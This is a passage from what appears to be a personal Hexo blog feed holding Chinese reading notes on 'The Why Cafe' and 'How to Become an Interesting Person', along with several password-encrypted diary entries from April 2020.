      <url>/2020/reading-note/%E3%80%8A%E4%B8%96%E7%95%8C%E5%B0%BD%E5%A4%B4%E7%9A%84%E5%92%96%E5%95%A1%E9%A6%86%E3%80%8B%20%E7%BA%A6%E7%BF%B0%C2%B7%E5%8F%B2%E5%B4%94%E5%8B%92%E5%9F%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%B8%96%E7%95%8C%E5%B0%BD%E5%A4%B4%E7%9A%84%E5%92%96%E5%95%A1%E9%A6%86%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><ol><li>高中的时候，我为了考大学而努力；上了大学，我为了找工作而努力；再之后，我来到公司上班，把时间花在努力升职上；现在，我开始质疑那些引导我沿着这条道路前行的人，怀疑他们只是把自己曾经接受过的指导跟我重复了一遍。  </li></ol><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><ol><li>这段路俨然是一条怨气十足的长蛇，我不过是上面的小小鳞片。  </li></ol><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><ol><li>因为家里有许多工作和生活上的烦心事儿，我才决定远行，想散散心；换句话说，家里的事儿已经够烦了，真没想到出了门还是这么烦。旅行的目的明明是为了让自己放松心情，再次鼓足干劲啊。  </li></ol><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><ol><li>“人到绝处，必能逢生。”我大声说。  </li><li>黑漆漆的天空中挂着一弯大大的新月，成千上万颗星星在闪耀。我打开咖啡馆的门，门把手上的小铃铛响起来，宣告了我的到来。  </li></ol><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><ol><li>你为什么来这里？<br>你害怕死亡吗？<br>你满足吗？  </li></ol><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><ol><li>“没问题。今天的午餐时间早就过去了，反倒是离明天的早餐时段更近。”<br>我瞄了一眼手表，已经晚上十点半了。“你看问题的角度真有意思。”我说。<br>凯茜微笑道：“从不同的视角看待事物，有时候能帮助我们解决问题。”<br>她记下我点的餐，转身离开。我注视着她走向厨房的背影，发现她把菜单留在了桌上。  </li></ol><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><ol><li>“问‘我为什么来这里？’的那个问题。”我插话道。<br>“对。这不是一个随便提出来的问题。对它一瞥而过是一回事；认认真真去看，然后扪心自问又是另一回事——你的世界会发生改变。我知道这听起来很极端，所以我们才在菜单封面上写了提示。”  </li></ol><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><ol><li>很多人都觉得‘挺好’。但有的人就是要寻找比‘挺好’更令人满意的状态、更棒的生活。  </li><li>要是有人找到了答案，就会产生另一股同样强大的力量。人们一旦知道了他们为什么来，为什么存在，找到了活着的目标——他们就想实现这个目标。这个目标就像藏宝图上代表藏宝地点的×。一旦看到了×，你就很难假装没看见，很难不去寻宝。回到我们说的具体问题上，一旦有人知道了他们来这里的目标，他们从情感上、甚至从生理上，都很难不去尝试实现那个目标。  </li><li>我希望你不要觉得这些事情要‘面对’，而是要‘迎接’。  </li></ol><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><ol><li>“约翰，你会吃惊的，有时候你只是没意识到，你早已准备好接纳新事物了。”  </li></ol><h3 id="09"><a href="#09" class="headerlink" title="09"></a>09</h3><ol><li>为了实现存在的意义，做你想做的任何事  </li><li>在我们努力实现PFE的过程中，我们受到的外部限制少之又少，更多的限制是我们自己加在自己头上的。  </li></ol><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><ol><li>“我知道，但至少对我来说，很多邮件确实是垃圾。而且，垃圾不止这些。我刚才在想，还有没有其他‘反向浪’占用了我每天的时间和精力。”  </li></ol><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><ol><li>“我这才意识到，对我来说，每一天都是一个机会，可以做我想做的事。每一天，我都有机会用行动回答菜单背面那个问题。我不需要等到‘退休’。”  </li><li>大家明明能做自己想做的事，却偏偏把那么多时间都花在准备工作上，而不是立刻就做，这是为什么呢？  </li></ol><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><ol><li>为什么人们把那么多时间花在准备工作上，而不是直接去做自己想做的事。部分原因就在于我们每天都暴露在大量营销信息中，如果不谨慎点儿，我们肯定会把自己的幸福和满足寄托在某样产品或服务上。最后，我们会陷入一种财务困境，必须不断去做事情去挣钱，尽管那些事情不是我们真正想做的。  </li><li>转变心态的重点在于，’他说，‘你要清楚，某样东西是否能让你的生活更圆满，由你自己说了算，和别人告诉你它圆不圆满无关。  </li></ol><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><ol><li>如果你已经做成想做的事，或者每天都在做想做的事，那就没理由害怕失去做这些事的机会。  </li></ol><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><ol><li>我觉得，如果我弄清了我为什么存在，开始做我认为可以实现自己目标的事情，那么我可能不会像现在这样看重金钱。  </li></ol><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><ol><li>当自己为实现存在意义而努力时，幸运的巧合就会自然出现，他们管这个叫顺其自然。  </li></ol><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><ol><li>你先别急着回答，我知道我首先应该问问自己，其实，你走过来的时候，我正在思考这个问题。但我真的很好奇，除了我自己可能想出的答案，还有没有更大、适用于更多人的答案。”<br>迈克端着马克杯，嘬了一口水，然后把杯子放在桌上，在我对面坐了下来。“关于那个问题，我们每个人都有自己的答案。”他开始解释，“这些答案是讲给自己听的，因为每个人的情况都独一无二。不过，确实有几个更大的决定性因素。”<br>“比如？”<br>“很多人从没想过自己的存在意义。有的人想过这个概念，但不知道自己有没有所谓的PFE。还有一些人因为自己的成长环境或者宗教信仰，不认为自己有权利去追求和实现自己的PFE。<br>“有人觉得自己有存在意义，并相信自己有权利去实现这个意义。但即便如此，有些人也不认为只要相信自己、只要去做，就能实现PFE，他们不相信这个过程有这么简单。<br>“这就要说回你和安妮聊的内容了。有很多人为了钱或权力，说服其他人去相信，他们的产品或服务是实现人生圆满的关键。想象一下，如果大家都意识到，我们的满足感其实掌握在自己手中，那前面那种人就会受到巨大的威胁。说服他人的那些人将失去他们的力量。对于这类人，失去对他人的影响力可不是什么好事情。”<br>“你让我想起我和凯茜刚才说的话。”我说，“她告诉我，如果有人弄清了自己的PFE，他们就会去做自己想做的事，成为自己想成为的人，不再需要别人的允许或同意。”<br>“没错。更严重的是，这样一来，再没有人能阻止或安排他人去做他们想做的事。我们每个人都能掌握自己的命运。”<br>我想了想，又回忆起我刚才和凯茜、安妮的对话：“你说的这种情况和我平时看到、听到的情况有很大差别。寻找自身存在的意义，掌握自己的命运，很多人接触这些问题都难，更别说采取后续行动和真正过上这样的生活了。”  </li><li>寻找自身存在的意义，掌握自己的命运，很多人接触这些问题都难，更别说采取后续行动和真正过上这样的生活了。  </li><li>除了我自己，没人关心我在哪儿击球；同理，在生活中，只有你真正了解自己存在的意义。永远不要因为其他人或事失去对自己命运的掌控。要积极地选择自己的人生道路，不然就只能被动接受安排。要学会移走你人生中的高尔夫球。  </li></ol><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><ol><li>你要记住一个关键点，自己的答案，全世界只有我们自己可以决定。所以很多人都在追寻答案的过程中选择独处。  </li></ol><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><ol><li>想到这些，我感觉自己非常渺小。我的烦恼，我的压力，我对未来的担忧，似乎一切都不重要了。在我以前的人生中，不管我做了或者没做什么，不管我的决定是对是错，还是对错参半，哪怕将来哪一天我已经不在，眼前的风景也依然会长久地存在下去。  </li><li>“约翰，生活本来就很精彩。只不过有人没发现自己是作者，没发现他们可以按自己的想法创作。”  </li></ol><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><ol><li>太阳即将从停车场对面的树林后升起，新的一天就要到来。空气中依然残留着昨夜的一丝沉寂，白昼的喧嚣却已经拉开了序幕。  <h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2>阿瑶推的一本书。<br>问自己：  <blockquote><p>你为什么来这里？<br>你害怕死亡吗？<br>你满足吗？<br>在看书的时候看到一句很有意思的话。人啊，长了颗红楼梦的心，却生活在水浒的世界，想交些三国里的桃园弟兄，却总遇到些西游记里的妖魔鬼怪。<br>人最害怕的是想要去做却没有了机会，因此才会害怕死亡。  </p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-21</title>
      <link href="/2020/diary/2020-4/2020-4-21/"/>
      <url>/2020/diary/2020-4/2020-4-21/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="7526216619393ccecc9966f7d3bc3ab998001f1bcb19c87c2bf810c56926c045">e32c27e47419b87d293b9e8ce412adf84cdbdb8bb07d6caa7a92ea6f1190801407af2415e4957cdc0e08126bc7ae547af4ada76f3ab79761aeae72c21364b4ace50718f376c84ed1ec259d9f4db3eeb5bdcb6a6e13bdf608625e32845c8b6ce8be64806b4bf36e334b2f5cd149972a294c254a5478922410d1a20e53b7751d09f29da622413e880ca4e81f77ba03bdcbffc8a9f1199b59e1c07fe7477a3932fcca022eb0e3c06e8b34542a8f1d330632bb7fab1f8ab9cbadf480ab4e92aa24e51fb10060fca923376e1cf957f55a00f4c27ac2b0ad0d07741c58a09b896908e4b4d17ba44ee041fe73dd92d10fe07fd204614e030f0dd1ec18bcdb2a85573073034c63971e2775cb7c0953a15b60a35f2a459d37a9a7185d61f7485d13e1d21ba9813e49570ee6316a528f223ed6407a55928271972e236c255f9f75375862c0253576eb268abfdf9164cec0bb0ec271432087f53455a4f6899343eeef6fc93dfdd94986624ff4131148b0c94fb155157f99c4b6978d86240f20a3cb62e5ef13a44fbbfa760480f7dedefe55fccbc7e9d3d4e05927584ceed46944c0a9e09cd518c189d00945888ccea699a6b4bfff4934f81a76bde1da86b708762f8fc9579b64e8030a20df539a877e40016c6f04cfe7868e30d641963ec643f1a8087f43899b8ae9d165d5b3d59f2675bac534f07ac4f091c0a6ead26fa05b8ca97202f3e57ee8c372ee85fa4fe55f68ff95581c5d6dd4c7ff12f9b04d6a883c7a7665c027b8bc3e5dbc3d624ddbe9501fa83808d6587aa01ba90339254ab76c4e0bcc86e4c541db3e640e11cd41e3272c0dfe09f4982c1ae99b538caa98c3bb8d697307b3377f9cd7b61fcfd9b11c7de11f1b215c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-14</title>
      <link href="/2020/diary/2020-4/2020-4-14/"/>
      <url>/2020/diary/2020-4/2020-4-14/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="db8a17cef4aea8f315851d0d9397c00051592e50f22605aaf0f21b56ab467f72">e32c27e47419b87d293b9e8ce412adf84cdbdb8bb07d6caa7a92ea6f119080146d72a46a32c642ae16f609784cbb486209afbc147fd181d153eae38a8c1a070445f4c4c9bbd99d4e29de3645ad6ff2d73441cdcbd97c6aa3492fb397245f4bd3843b4887b5d3d1ebcd8d370bb6e84ed3961b94fd887b9bfed3957c6ee6875fd8964d8b02d1db14c67c00376d9f90963ac1cdd2df33bc3ac12e19f58c3fe49743c18fcd379b40c0ef078ce00bba5b5e92c5fad4dc4618dc230e18daa86271eaad7c94e4912ebcbd5c2544b5d282290ccb2d9f149c0d7e8411f2ecb92220c33a255f6d84f2cd00dfa435f9a73cf65453a74ce100072564008b8d183fb80b080a6eb29d6bf4fe83461ba54fd1bc31aa661deb45dacb6371db25e288579aa4b82f19696949ad8cdf37a74089e6df91a983c9e13dee9bc2033003f6aa47a99ccf7ba8f7de5b61a3620349655a0536873fca5a14abf72d8525dcd446dd6e69b4767cd7a5ab91d6fa2b6cd7aba39baeacc2ebfc8cc7c42939f90fdd82875b6c00d363f9dd6a21e94b02689b2855010954e2073e505a6493f512f1aafbdcf0088d10ae842c69ef6af4c0130f13ac4272b5a25766493cc9e31541ce4f75e448c138b3aec95898a926ddbee030119972df43b043a93abb8e781d04b1ae5472c40a6a78fa37741e471aee6b1c48ab9283bc0175136cc064a11ed557637b09f2a8cce6ce6727cbf9ddfdae4f70dc8e42d761e758c08de317e508d342c4cdd4bd4443ebfe41627bf796a6fd939d50088339865bb60c0a3cd6fcf67b01264e19d6720aff94a24e2f12d6bc34a908fcd7d8934fb392d7e330305f07062708aac02d0819639c934539432457aab20750556529ea98e81af475843724a93c01bdd6374c9ee6157034061be82949450a4a28450e22168103f0836eee3aa63c4556385c80568d4fe74186bfd34878b55e5524fcfbb537fa043c9caad8d92bcd35f2afc4218b636d6c47a0a04fed33763ca6cf3e6b405570cd71927b58e5118685d5d5dab7e00d8442a8b9e20b55cc9bb8dfb09a1109ebb29623280250fbe145993e8249ebf9e2a455acb1863f666ffa8c3b04d955fa7cdd1bb7</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-13</title>
      <link href="/2020/diary/2020-4/2020-4-13/"/>
      <url>/2020/diary/2020-4/2020-4-13/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="bad0e7b946a36aa18d1fdefb3f307d1eed3fe4100e01d82fb2286b480bf8a5c8">e32c27e47419b87d293b9e8ce412adf84cdbdb8bb07d6caa7a92ea6f11908014fb7ec7ca5571c0043d68c7ed0bd01a8d5ca4bc4c061383ae4202823da59f195fd86f4d7a33ee555bc6fa0946ca5e5bb5f4da03cc86bca778f95bafeeeefe83807ffa97f147ee79b89521d03a4be9e2e39b118e7567fbad248d9adf532e5f36f04dcc1ede89b493b3295b7cfd24ce724a4c63409c90a26318f0e845a302e79dba290b2d1150eb96acd6edb95d3c66078edf3996840c781322ec682aa37ad8c597e544f42b983ae55e4220b232b9299f0ee94e27c52b42c6134307e5ebfc0195ed4ec28e782c633afe59504e336378b7e8799d65119707f93220a3cfa22193cf915aedcfba938a250a969afba0f0ee7cd1106ae82af244e72eb1a83adbbf6a4c972b5f49a1afcdc16dc4cdf8dff829b57679d2a241b7ad2552540f917c5d4d2771d924ee6fe5efb0f2f709476ce44f9290f3fe141e9724c4f1c98cb8cb1f23766457529b5503a244640af547e1aaa5e1bfb33e35fcb675d76bba3d73f3b8f7762673484cd0d3e06aa7002b3579728c0f0cf523fe50ad3a499714c91768958df94a86ee7b96dbf73e02ad6316530066bc183bc24df634939074bc888ed32b9b931badb08be4f8fc4df06cc38f50a1eeaf7bc0da5dd8a8ffa16f6e9fb2281e2c0ef3105b686b5608e4043c3748ceac79295063bedf5a5cbdcf787ec7555555f7b415439674a5966ec4927b0c4a14504913d90897bbfe82fe194c9503224e70c96191607f4a447e20a4612348f3b24b087303ddcc8fac774d0e7aec66c2d3fc266fb4dff9346c7cf378d597ac1acc43aa703eeabbd844c34cf746457b27b24a98d394</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《如何成为一个有趣的人》 王小圈</title>
      <link href="/2020/reading-note/%E3%80%8A%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%BA%E3%80%8B%20%E7%8E%8B%E5%B0%8F%E5%9C%88/"/>
      <url>/2020/reading-note/%E3%80%8A%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%BA%E3%80%8B%20%E7%8E%8B%E5%B0%8F%E5%9C%88/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%BA%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ol><li>“有趣”不仅仅是一种生活态度，还是一种技能。  </li></ol><h3 id="第1章-有趣是一场令人愉悦的意外"><a href="#第1章-有趣是一场令人愉悦的意外" class="headerlink" title="第1章 有趣是一场令人愉悦的意外"></a>第1章 有趣是一场令人愉悦的意外</h3><ol><li>当一个人既不愿意为“正事”付出太多，又嫌弃“消遣”回报太少时，一种困惑、迷茫、犹疑、不悦的感觉就出来了，我们称之为——无聊。  </li><li>有足够个人空间的人才会无聊。<br>叔本华还说过刺猬困境（Hedgehog’s dilemma），人跟人就像冬天里的刺猬，围着彼此取暖又不能把彼此戳到，所谓近之则不逊远之则怨。随着大城市人口流动性的增加，人与人之间的心理距离也越来越大，后果之一便是“容易有孤独感”——每个人都是一座孤岛。孤岛与孤岛之间缺乏深层次的沟通交流，更易无聊。  </li></ol><h3 id="1-2-有趣是个什么东西"><a href="#1-2-有趣是个什么东西" class="headerlink" title="1.2 有趣是个什么东西"></a>1.2 有趣是个什么东西</h3><ol><li>本质上，“有趣”是一场令人愉悦的意外，是一种无关功利的惊喜。<br>首先，有趣是一种意外。别人认为你本应该是这样的，而你不是。  </li><li>带来愉快的“意外感”可以分两种。<br>1．我不知道你是这样啊！  </li><li>2．我知道你原来是这样，但是我不知道你“这样”到这种程度。  </li><li>“有趣”是指对方能给予自己精神享受和深入思考，且对方的格调在自己格调的上限附近。<br>“逗比”是指对方能娱乐自己，且笑点在自己格调的中心线或下限附近。<br>“幽默”则是笑点的统称，格调相对高的幽默可以归入有趣，格调相对低的幽默可以归入逗比。  </li></ol><h3 id="2-2-审美，到底审的是什么"><a href="#2-2-审美，到底审的是什么" class="headerlink" title="2.2 审美，到底审的是什么"></a>2.2 审美，到底审的是什么</h3><ol><li>如果健康就是美，那么，最美的身材一定要裹着一层不薄的皮下脂肪：肥肉上的皮肤细腻光滑手感柔软，微凸的小腹守护内脏的温度。万一摔倒，无处不在的肉肉360°提供减震功能，万一出现意外，肉肉们作为储备能源提供紧急庇护——这就是人类赖以生存的脂肪的伟大意义，无论你觉得它们美不美，它们默默守护人类千万年。如今，人类中的一小撮人从饥饿威胁中逃脱了没几年，就开始厌恶身上曾经赖以保命的脂肪，真是忘恩负义。  </li></ol><h3 id="2-3-“城会玩”，玩的是什么"><a href="#2-3-“城会玩”，玩的是什么" class="headerlink" title="2.3 “城会玩”，玩的是什么"></a>2.3 “城会玩”，玩的是什么</h3><ol><li>不论是哪一种方式，对“会玩”的欣赏，体现了我们对挣脱常规生活方式的渴望。我们通过对生活的解构和重组，以期待生活变得更有趣一点。  </li></ol><h3 id="第3章-兴趣是天生的，无聊是被逼的"><a href="#第3章-兴趣是天生的，无聊是被逼的" class="headerlink" title="第3章 兴趣是天生的，无聊是被逼的"></a>第3章 兴趣是天生的，无聊是被逼的</h3><ol><li>如果把人的知识面比作一个圆，好奇心就是圆周，当我们的圆更大，圆周也会变得更大。某天当我们的知识多出一个小小角，这个周长也会增加一大截。  </li><li>一个人去过很多地方，却对此无甚兴趣，亦不求探索，那“去很多地方”便毫无意义。<br>一个人看过很多书，却对书不求甚解，亦不做平行或纵深的比较阅读，只是“酒肉穿肠过”般的“文字穿眼过”，那么读书便毫无意义。<br>一个人交往过很多人，却对那些人不加琢磨，亦不追寻其内心深处的灵魂栖息地，只看“你对我好”“你对我不够好”，那么这段感情便毫无意义。<br>一个人经历过很多故事，却对得失不做总结，亦不追求做事精进的方法，只把“当年我如何如何”挂在嘴边作为谈资，那么这些故事再多也没有意义。<br>没有探索的好奇心，就没有经历的意义。  </li><li>拿起手机，刷各种碎片信息——与其说是我们在吸收信息，不如说是各种垃圾信息在吸收我们，占据我们的时间，吞噬我们的生命。  </li></ol><h3 id="3-3-像哲学家一样观察世界：视角陌生化"><a href="#3-3-像哲学家一样观察世界：视角陌生化" class="headerlink" title="3.3 像哲学家一样观察世界：视角陌生化"></a>3.3 像哲学家一样观察世界：视角陌生化</h3><ol><li>我们需要偶尔把自己陌生化。把自己当作一个客体去看待、去围观，以一个旁观者的视角去观察自己的生活状态，会发现很多很多问题。<br>如果你觉得陌生化后你的生活是荒谬的，那说明你已经偏离自己想要的轨道了，早发现早治疗，可能还有救。  </li></ol><h3 id="第4章-“有趣”是一种技能"><a href="#第4章-“有趣”是一种技能" class="headerlink" title="第4章 “有趣”是一种技能"></a>第4章 “有趣”是一种技能</h3><ol><li>高风险的事情，玩票儿就像买彩票，你孤注一掷了就是赌博。  </li><li>无知是最大的不自由。你知道的有效信息越多，你的选择余地越大；你的知识储备越广，你的思想就越自由。知识储备，是构建精神世界的基石。<br>知识储备的获得渠道很多，主要渠道不过三种：历练、阅读、交友。  </li></ol><h3 id="4-2-世界不是平的——信息管理能力"><a href="#4-2-世界不是平的——信息管理能力" class="headerlink" title="4.2 世界不是平的——信息管理能力"></a>4.2 世界不是平的——信息管理能力</h3><ol><li>知识结构的“广度”是一个人“有聊”还是“无聊”的关键，而知识结构的“深度”是一个人“肤浅”还是“深刻”的关键。  </li></ol><h3 id="4-3-玻璃钢心——感知能力"><a href="#4-3-玻璃钢心——感知能力" class="headerlink" title="4.3 玻璃钢心——感知能力"></a>4.3 玻璃钢心——感知能力</h3><ol><li>一个敏感的人，他眼中的世界会更为丰富，从一定程度上说，这种丰富杜绝了一部分单调的可能。可以把自己想象成一座雷达，拒绝迟钝，时刻准备着，把全身的传感器都打开，去看去听去品；去感受这个世界每一分每一秒的步移景换，去感受内心哪怕最小的涟漪，让世界在你心里慢慢丰富起来。  </li></ol><h3 id="4-4-品味是做人的底线——鉴赏能力"><a href="#4-4-品味是做人的底线——鉴赏能力" class="headerlink" title="4.4 品味是做人的底线——鉴赏能力"></a>4.4 品味是做人的底线——鉴赏能力</h3><ol><li>如果风格偏细腻，《红楼梦》——张爱玲——王安忆是一条线，看红楼梦的时候扩展阅读一下《金瓶梅》，往上看往外看不要错过《源氏物语》《枕草子》。看张爱玲的时候不拘中外绕回去看毛姆，再看看《孽海花》。讲儿女情长，喜欢风格诡谲的，可以看看李碧华。同样讲建国后的上海女人，可以看苏童讲她们在大陆的一番人生，也可以看白先勇讲她们在台湾的另一番人生。这一气下来，论文风论故事，这些人的作品彼此独立又各有关联，每读一本新书，真是初见有初见的欢喜，旧识有旧识的熟悉。  </li></ol><h3 id="4-5-天马行空有航线——严谨的想象力"><a href="#4-5-天马行空有航线——严谨的想象力" class="headerlink" title="4.5 天马行空有航线——严谨的想象力"></a>4.5 天马行空有航线——严谨的想象力</h3><ol><li>所以想象力是什么？是基于已知信息的截取、拼接、重组信息的能力。  </li><li>最好的想象力，是在丰富知识下逻辑自洽的想象力，越多知识，越多想象。只有填鸭式机械灌输的知识、教条式死板被动的知识才会让孩子失去想象的空间。当你真正对知识感兴趣并不断探索时，丰富扎实的知识结构会构成想象力坚实的骨架。  </li></ol><h3 id="第5章-有趣是一种态度"><a href="#第5章-有趣是一种态度" class="headerlink" title="第5章 有趣是一种态度"></a>第5章 有趣是一种态度</h3><ol><li>这世上哪有什么努力不努力，只有值不值。  </li></ol><h3 id="5-2-我不是一个随便的人——个人特质"><a href="#5-2-我不是一个随便的人——个人特质" class="headerlink" title="5.2 我不是一个随便的人——个人特质"></a>5.2 我不是一个随便的人——个人特质</h3><ol><li>有趣不是完美，是真诚，真性情，高兴了笑，不喜了哭，有血有肉。但这些真诚都是在与人无伤且无伤大雅的范畴内，不是高兴了癫狂不喜了撒泼，也不是分内的事情失职。  </li></ol><h3 id="5-4-赞美、倾听、反驳——情绪沟通"><a href="#5-4-赞美、倾听、反驳——情绪沟通" class="headerlink" title="5.4 赞美、倾听、反驳——情绪沟通"></a>5.4 赞美、倾听、反驳——情绪沟通</h3><ol><li>反驳的前提，是有主见。我认为“不是这样的”才反驳，而不是我看你不顺眼，为了反驳而反驳。而有主见这个恰恰最难。需要你有知识，有逻辑，才能建立起自己完整的一整套世界观，并且在自己的世界观里“逻辑自洽”地游走，才能用这一套逻辑去反驳别人。  </li><li>有人曾问我对另一半的最基本要求是什么。我说，起码能反驳我，并且说服我一次。  </li></ol><h3 id="6-2-性格内向-不善表达吗"><a href="#6-2-性格内向-不善表达吗" class="headerlink" title="6.2 性格内向=不善表达吗"></a>6.2 性格内向=不善表达吗</h3><ol><li>内向和外向本来就是性格被刻意二元化的产物，大多数人存在于两极之间。  </li><li>人生中的陪伴都是一时的，只有分别是永恒的；热闹都是一时的，只有寂寞是永恒的。寂寞的时候再妖娆的宝莱坞也无法令人骚动，再狂欢的杯觥交错也无法令人开怀。人寂寞起来，除了酒杯，无处可逃。  </li><li>只有我一个人的时候，宇宙是我的，天地是我的，我是我自己的。为何不自我接纳、享受着纯粹美妙的寂寞呢：这是我——一个内向者的心声。  </li></ol><h3 id="6-3-有钱了不起吗？你说呢"><a href="#6-3-有钱了不起吗？你说呢" class="headerlink" title="6.3 有钱了不起吗？你说呢"></a>6.3 有钱了不起吗？你说呢</h3><ol><li>不对这个泛泛的世界投注太多的感情、太多的时间、太多的金钱，把注意力集中在自己感兴趣的内容上；目标明确，专注不暧昧；该工作工作，该玩玩，情绪与情绪界限清晰，把心情分门别类、收纳妥当；把有限的资源花到最值得的地方——这是我对极简主义的理解。  </li><li>“极简”和“轻奢”一个做减法，一个做加法，互不矛盾，可以并行，能在成本可控的前提下提高生活品质。需要注意的是，我推崇的极简主义不等于“悭吝死抠”，轻奢主义不等于“虚荣臭美”。  </li></ol><h3 id="第7章-终极有趣——精神世界的创造与维护"><a href="#第7章-终极有趣——精神世界的创造与维护" class="headerlink" title="第7章 终极有趣——精神世界的创造与维护"></a>第7章 终极有趣——精神世界的创造与维护</h3><ol><li>有趣不是“搞笑”，不是“逗闷子”，甚至不是“幽默”。有趣比这些来得更为深远，有趣是学识的广博，思想的深邃，观念的透彻。  </li><li>很多人觉得他们在思考，其实他们只是在重整他们的偏见。  </li><li>一个稳定的三观才能给人以思考的能力，而不是重整偏见的能力；给人以理性认知世界的能力，而不是人云亦云随风倒的能力。这种能力会让人在每一次独立思考后逐渐形成独立的与众不同的精神世界，从而成为一个“独特”的人  </li><li>放眼看去，意识形态裹挟背后的动机滚滚而下，身在其中你我皆不能幸免。正面看着是笑脸，背后看都是利益诉求。如果放眼所见皆是幻象，那在这虚幻中沉浮的你我何以不为人圈套，何以构建真实的三观？  </li><li>“为天地立心，为生民立命，为往圣继绝学，为万世开太平。”——这是张载作为一个儒家知识分子的世界。  </li></ol><h3 id="7-2-一只随波逐流的帆水母"><a href="#7-2-一只随波逐流的帆水母" class="headerlink" title="7.2 一只随波逐流的帆水母"></a>7.2 一只随波逐流的帆水母</h3><ol><li>上下五千年，纵横九万里，与千千万万时间和空间之间，你恰好在这里——你的身体在这里，你的思想在这里，你的角度就在这里。你的局限在这里，你的独特也在这里。  </li><li>有一种很漂亮的蓝色透明小水母——帆水母。它有一个充气的帆状浮囊来维持浮力，平时让风吹着走。鳔上有像帆的构造，帮助它们随风而荡。帆水母的种群非常大，常结成宽达100千米的大群在海面上漂游。它们随风飘荡，有时也会搁浅在沙滩上成片死亡。<br>这很像是人类社会的写照。大多数人一团一团淹没在群体中，以统计数字的形式存在着。  </li></ol><h3 id="7-3-吸引力相对论"><a href="#7-3-吸引力相对论" class="headerlink" title="7.3 吸引力相对论"></a>7.3 吸引力相对论</h3><ol><li>人真是一种矛盾的动物，有时候喜欢高调宣布自己多么与众不同，有时候迫不及待跟风怕被人说不一样。当大家都想要与众不同的时候，就成了被跟风的与众不同。  </li><li>我觉得思想上也是这样，努力在非常舒服的时候自己去找不适感，去分析思考问题，去质疑自己的观点，去打破自己的思想桎梏，而不是去“求认同”。尽量去一点一点啃食让我觉得辛苦的艰深的书，而不是止步于高潮迭起的快感文字爽到飞起。  </li><li>你自己则每日在这个世界里修修补补自得其乐，有时候也会自己给自己刮一场龙卷风，放一把火，让一切推倒重来。  </li><li>我不喜欢被人调教，也不喜欢操纵别人。<br>我喜欢，互相玩。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《我们仨》 杨绛</title>
